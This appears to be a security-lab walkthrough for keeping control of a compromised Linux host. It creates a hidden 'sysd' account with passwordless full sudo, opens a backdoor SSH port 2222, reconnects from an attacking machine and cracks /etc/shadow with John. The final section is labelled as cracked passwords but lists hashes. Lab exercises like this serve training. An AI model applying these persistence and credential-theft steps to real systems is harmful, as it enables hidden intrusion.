## Advanced Bash: Owning the System

### Step 1: Shadow People

In this step, you'll create a "secret" user named sysd. Anyone examining /etc/passwd will assume that this is a service account, but in fact, you'll be using it to reconnect to the target machine for further exploitation.

- **Create a sysd User Without Creating a Home Folder**:

  - **Command:**
    ```
    useradd sysd
    ```

- **Set a Password for sysd**:

  - **Command:**
    ```
    passwd sysd
    ```

- **Assign a System UID Below 1000 to sysd**:

  - **Command:**
    ```
    usermod -u 400 sysd
    ```

- **Give sysd a Group ID (GID) That Matches Its UID**:

  - **Command:**
    ```
    groupmod -g 400 sysd
    ```

- **Grant sysd Full Sudo Access Without a Password**:

  - Add the following line to the `/etc/sudoers` file:
    ```
    sysd ALL=(ALL:ALL) NOPASSWD:ALL
    ```

- **Test sudo Access**:

  - Run `sudo -l` to verify that the terminal does not prompt for a password.
  - Test other commands requiring elevated privileges.

### Step 2: Smooth Sailing

In this step, you'll allow SSH access via port 2222. SSH usually runs on port 22, but opening port 2222 will allow you to log in as your secret sysd user without connecting to the standard (and well-guarded) port 22.

- **Update SSH Configuration**:
  - Open the SSH configuration file with Nano:
    ```
    sudo nano /etc/ssh/sshd_config
    ```
  - Add the following line under `Port 22` to allow SSH access via port 2222:
    ```
    Port 2222
    ```
  - **Restart SSH Service**:
    ```
    sudo systemctl restart sshd
    ```

### Step 3: Testing Your Configuration Update

- **Log Out and Test the New Backdoor SSH Port**:
  - Log out of the root account and log off the target machine.
  - From your attacking machine, SSH back into the target machine as the sysd user on port 2222:
    ```
    ssh sysd@192.168.6.105 -p 2222
    ```
  - **Switch Back to Root User**:
    ```
    sudo su
    ```

### Step 4: Crack All the Passwords

To strengthen our control of this system, we will attempt to crack as many passwords as we can.

- **Use John to Crack the Passwords in /etc/shadow**:
  - **Command:**
    ```
    john /etc/shadow
    ```

### Step 5: Matched Passwords to Users

- **Password List from Cracked /etc/shadow**:
  - **stallman**: `$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00`
  - **babbage**: `$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0`
  - **mitnick**: `$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0`
  - **lovelace**: `$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3`
  - **turing**: `$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1`

**End of Advanced Bash: Owning the System**

